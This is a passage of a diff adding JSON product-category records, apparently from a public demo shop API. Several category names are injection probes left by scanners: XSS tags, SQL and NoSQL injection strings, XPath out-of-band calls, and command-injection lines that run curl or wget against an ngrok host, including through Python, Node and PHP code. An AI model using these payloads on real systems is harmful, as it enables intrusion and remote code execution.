+        "updatedAt": "2026-03-17T17:36:19.000Z"
+    },
+    {
+        "id": 711,
+        "name": "testVia: 1.1 evil-proxy",
+        "slug": "testvia-1-1-evil-proxy",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:19.000Z",
+        "updatedAt": "2026-03-17T17:36:19.000Z"
+    },
+    {
+        "id": 712,
+        "name": "<script>alert('xss5b1981ea')</script>",
+        "slug": "script-alert-xss5b1981ea-script",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:23.000Z",
+        "updatedAt": "2026-03-17T17:36:23.000Z"
+    },
+    {
+        "id": 713,
+        "name": "{\"$gt\": \"\"}<!-- SO2ND_nosqli_b4aab7b0 -->",
+        "slug": "gt-so2nd-nosqli-b4aab7b0",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:30.000Z",
+        "updatedAt": "2026-03-17T17:36:30.000Z"
+    },
+    {
+        "id": 714,
+        "name": "<img src=x onerror=alert('SO2ND_xss_10b802d7'+1)>",
+        "slug": "img-src-x-onerror-alert-so2nd-xss-10b802d7-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:43.000Z",
+        "updatedAt": "2026-03-17T17:36:43.000Z"
+    },
+    {
+        "id": 717,
+        "name": "' or doc('https://uncloyed-eden-soughfully.ngrok-free.dev/i/f60fd835374fb841962f')='",
+        "slug": "or-doc-https-uncloyed-eden-soughfully-ngrok-free-dev-i-f60fd835374fb841962f",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:37:35.000Z",
+        "updatedAt": "2026-03-17T17:37:35.000Z"
+    },
+    {
+        "id": 718,
+        "name": "1) or doc('https://uncloyed-eden-soughfully.ngrok-free.dev/i/f60fd835374fb841962f') or (1",
+        "slug": "1-or-doc-https-uncloyed-eden-soughfully-ngrok-free-dev-i-f60fd835374fb841962f-or-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:37:36.000Z",
+        "updatedAt": "2026-03-17T17:37:36.000Z"
+    },
+    {
+        "id": 719,
+        "name": "' or unparsed-text('https://uncloyed-eden-soughfully.ngrok-free.dev/i/f60fd835374fb841962f')='",
+        "slug": "or-unparsed-text-https-uncloyed-eden-soughfully-ngrok-free-dev-i-f60fd835374fb841962f",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:37:36.000Z",
+        "updatedAt": "2026-03-17T17:37:36.000Z"
+    },
+    {
+        "id": 720,
+        "name": "' or saxon:parse('https://uncloyed-eden-soughfully.ngrok-free.dev/i/f60fd835374fb841962f')='",
+        "slug": "or-saxon-parse-https-uncloyed-eden-soughfully-ngrok-free-dev-i-f60fd835374fb841962f",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:37:37.000Z",
+        "updatedAt": "2026-03-17T17:37:37.000Z"
+    },
+    {
+        "id": 722,
+        "name": "; curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/766d9f3beaeae72504d2/cmdi #",
+        "slug": "curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-766d9f3beaeae72504d2-cmdi",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:39:32.000Z",
+        "updatedAt": "2026-03-17T17:39:32.000Z"
+    },
+    {
+        "id": 723,
+        "name": "; wget -q https://uncloyed-eden-soughfully.ngrok-free.dev/i/766d9f3beaeae72504d2/cmdi -O /dev/null #",
+        "slug": "wget-q-https-uncloyed-eden-soughfully-ngrok-free-dev-i-766d9f3beaeae72504d2-cmdi-o-dev-null",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:39:34.000Z",
+        "updatedAt": "2026-03-17T17:39:34.000Z"
+    },
+    {
+        "id": 724,
+        "name": "1 AND 1=0",
+        "slug": "1-and-1-0",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:39:44.000Z",
+        "updatedAt": "2026-03-17T17:39:44.000Z"
+    },
+    {
+        "id": 725,
+        "name": "; id #;echo SO2ND_command_injection_cd607bd3;",
+        "slug": "id-echo-so2nd-command-injection-cd607bd3",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:40:19.000Z",
+        "updatedAt": "2026-03-17T17:40:19.000Z"
+    },
+    {
+        "id": 726,
+        "name": "' OR '1'='1/*SO2ND_sqli_2591d5b4*/",
+        "slug": "or-1-1-so2nd-sqli-2591d5b4",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:40:21.000Z",
+        "updatedAt": "2026-03-17T17:40:21.000Z"
+    },
+    {
+        "id": 727,
+        "name": "; curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/e5a724cb74e02a1a1b36/rce #",
+        "slug": "curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-e5a724cb74e02a1a1b36-rce",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:40:57.000Z",
+        "updatedAt": "2026-03-17T17:40:57.000Z"
+    },
+    {
+        "id": 728,
+        "name": "; wget -q https://uncloyed-eden-soughfully.ngrok-free.dev/i/e5a724cb74e02a1a1b36/rce -O /dev/null #",
+        "slug": "wget-q-https-uncloyed-eden-soughfully-ngrok-free-dev-i-e5a724cb74e02a1a1b36-rce-o-dev-null",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:40:58.000Z",
+        "updatedAt": "2026-03-17T17:40:58.000Z"
+    },
+    {
+        "id": 729,
+        "name": "__import__('os').popen('curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/e5a724cb74e02a1a1b36/rce').read()",
+        "slug": "import-os-popen-curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-e5a724cb74e02a1a1b36-rce-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:40:59.000Z",
+        "updatedAt": "2026-03-17T17:40:59.000Z"
+    },
+    {
+        "id": 730,
+        "name": "require('child_process').execSync('curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/e5a724cb74e02a1a1b36/rce')",
+        "slug": "require-child-process-execsync-curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-e5a724cb74e02a1a1b36-rce",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:40:59.000Z",
+        "updatedAt": "2026-03-17T17:40:59.000Z"
+    },
+    {
+        "id": 731,
+        "name": "<?php system('curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/e5a724cb74e02a1a1b36/rce'); ?>",
+        "slug": "php-system-curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-e5a724cb74e02a1a1b36-rce",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:40:59.000Z",
+        "updatedAt": "2026-03-17T17:40:59.000Z"
+    },
+    {
+        "id": 732,
+        "name": "test%0d%0a%0d%0a%0d%0a<script>alert(1)</script>: injected",
+        "slug": "test-0d-0a-0d-0a-0d-0a-script-alert-1-script-injected",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:44:47.000Z",
+        "updatedAt": "2026-03-17T17:44:47.000Z"
+    },
+    {
+        "id": 733,
+        "name": "New Ctg",
+        "slug": "new-ctg",
+        "image": "https://placeimg.com/640/480/any",
+        "creationAt": "2026-03-17T18:01:55.000Z",
+        "updatedAt": "2026-03-17T18:01:55.000Z"
+    },
+    {
+        "id": 734,
+        "name": "New Categories",
+        "slug": "new-categories",
+        "image": "https://placeimg.com/640/480/any",
+        "creationAt": "2026-03-17T18:05:07.000Z",
+        "updatedAt": "2026-03-17T18:05:07.000Z"
+    },
+    {
+        "id": 735,
+        "name": "tênis de corrida",
+        "slug": "tenis-de-corrida",
+        "image": "https://www.google.com/imgres?q=tenis%20corrida&imgurl=https%3A%2F%2Flncimg.lance.com.br%2Fcdn-cgi%2Fimage%2Fwidth%3D950%2Cquality%3D75%2Cfit%3Dpad%2Cformat%3Dwebp%2Fuploads%2F2024%2F08%2Ffila-capa-aspect-ratio-512-320.png&imgrefurl=https%3A%2F%2Fwww.lance.com.br%2Flance-indica%2Ftenis-de-corrida-bom-e-barato-para-comprar-em-2024.html&docid=5hqbmPO8vKYzmM&tbnid=ajILeRIDVlMkGM&vet=12ahUKEwjX56ajt6eTAxWpH7kGHaCTNOMQnPAOegQIExAB..i&w=950&h=593&hcb=2&ved=2ahUKEwjX56ajt6eTAxWpH7kGHaCTNOMQnPAOegQIExAB",
+        "creationAt": "2026-03-17T18:42:26.000Z",
+        "updatedAt": "2026-03-17T18:42:26.000Z"
+    },
+    {
+        "id": 736,
+        "name": "tenis",
+        "slug": "tenis",
+        "image": "https://via.placeholder.com/150",
+        "creationAt": "2026-03-17T18:43:27.000Z",
+        "updatedAt": "2026-03-17T18:43:27.000Z"
+    }
+]
